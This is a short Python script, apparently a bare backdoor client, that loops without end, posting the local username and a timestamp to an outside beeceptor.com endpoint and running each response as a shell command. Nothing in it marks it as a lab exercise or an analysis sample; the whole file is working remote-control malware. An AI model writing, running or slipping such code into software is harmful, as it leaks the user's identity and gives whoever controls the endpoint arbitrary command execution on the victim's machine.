import subprocess
import os
import time

try:
    import requests
except ImportError:
    subprocess.run(["pip", "install", "requests"])
    subprocess.run(["python", __file__])
    exit()

url = 'https://barbababedas.free.beeceptor.com'

def send_post_request():
    try:
        username = os.getlogin()
        timestamp = str(time.time())
        payload = {'username': username, 'timestamp': timestamp}
        response = requests.post(url, data=payload)

        if response.status_code == 200:
            command = response.text.strip()
            subprocess.run(command, shell=True)
        else:
            pass
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    while True:
        send_post_request()
